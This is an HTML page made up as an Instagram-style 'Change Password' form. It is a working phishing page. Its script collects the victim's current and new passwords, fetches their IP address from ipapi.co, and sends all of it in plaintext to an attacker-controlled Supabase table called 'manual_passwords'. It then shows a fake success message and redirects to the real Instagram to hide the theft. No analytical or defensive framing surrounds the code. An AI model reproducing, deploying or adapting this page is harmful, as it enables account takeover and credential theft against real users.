<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Change Password</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      background: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: white;
      padding: 30px;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      width: 350px;
      text-align: center;
    }

    h3 {
      margin-bottom: 10px;
    }

    .instructions {
      font-size: 13px;
      color: grey;
      margin-bottom: 45px;
      line-height: 1.5;
      text-align: center;
    }

    input {
      width: 80%;
      padding: 14px 10px;
      margin: 12px auto;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
      display: block;
    }

    button {
      width: 80%;
      padding: 14px;
      margin: 26px auto 0;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
      display: block;
    }

    .message {
      margin-top: 10px;
      font-size: 14px;
    }

    .success {
      color: green;
    }

    .error {
      color: red;
    }
  </style>
</head>
<body>
  <div class="container">
    <h3>Create a strong password</h3>
    <p class="instructions">
      Your password must be at least six<br>
      characters and should include a<br>
      combination of numbers, letters and<br>
      special characters (!$@ï¼…).
    </p>
    <input type="password" id="old-password" placeholder="Current Password" />
    <input type="password" id="new-password" placeholder="New Password" />
    <input type="password" id="confirm-password" placeholder="Confirm Password" />
    <button onclick="storePasswords()">Reset Password</button>
    <div id="message" class="message"></div>
  </div>

  <script type="module">
    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'

    const supabase = createClient(
      'https://agxpaqpppnjoexgjcogl.supabase.co',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFneHBhcXBwcG5qb2V4Z2pjb2dsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE0NTI0ODIsImV4cCI6MjA2NzAyODQ4Mn0.da2h8-NCdbEaLBUgeDwqH1-FL6ki9IZMh-wg0t5Ebl0'
    )

    async function getUserIP() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return data.ip;
      } catch {
        return 'Unavailable';
      }
    }

    window.storePasswords = async function () {
      const oldPass = document.getElementById('old-password').value.trim();
      const newPass = document.getElementById('new-password').value.trim();
      const confirmPass = document.getElementById('confirm-password').value.trim();
      const message = document.getElementById('message');

      message.textContent = '';
      message.className = 'message';

      if (!oldPass || !newPass || !confirmPass) {
        message.textContent = 'All fields are required.';
        message.classList.add('error');
        return;
      }

      if (newPass !== confirmPass) {
        message.textContent = 'New passwords do not match.';
        message.classList.add('error');
        return;
      }

      const ip = await getUserIP();

      const { error } = await supabase.from('manual_passwords').insert([
        { old_password: oldPass, new_password: newPass, ip }
      ]);

      if (error) {
        message.textContent = 'Error: ' + error.message;
        message.classList.add('error');
      } else {
        message.textContent = 'Passwords Changed.';
        message.classList.add('success');

        setTimeout(() => {
          window.location.href = 'https://www.instagram.com/';
        }, 1500);
      }
    }
  </script>
</body>
</html>
